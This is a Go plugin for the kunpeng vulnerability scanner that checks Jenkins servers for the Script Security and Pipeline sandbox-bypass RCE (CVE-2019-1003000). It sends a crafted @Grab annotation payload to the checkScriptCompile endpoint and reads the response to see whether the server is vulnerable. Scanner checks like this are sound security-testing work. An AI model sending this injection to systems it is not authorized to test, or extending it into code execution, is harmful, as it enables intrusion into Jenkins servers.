package goplugin

import (
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type jenkinsPluginRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("jenkins", &jenkinsPluginRCE{})
}
func (d *jenkinsPluginRCE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Jenkins Script Security and Pipeline 插件远程代码执行",
		Remarks: "该漏洞通过将AST转换注释（如@Grab）应用于源代码元素，可以在脚本编译阶段避免脚本安全沙箱保护。所以会造成具有“Overall/Read”权限的用户或能够控制SCM中的Jenkinsfile或者sandboxed Pipeline共享库内容的用户可以绕过沙盒保护并在Jenkins主服务器上执行任意代码。",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html",
			CVE:  "CVE-2019-1003000",
			KPID: "KP-0075",
		},
	}
	return d.info
}
func (d *jenkinsPluginRCE) GetResult() []plugin.Plugin {
	return d.result
}

func (d *jenkinsPluginRCE) Check(URL string, meta plugin.TaskMeta) bool {
	poc := `/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vultestvultest%27,%20version=%271%27)%0aimport%20Payload;`
	request, err := http.NewRequest("GET", URL+poc, nil)
	if err != nil {
		return false
	}
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "package#vultestvultest") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
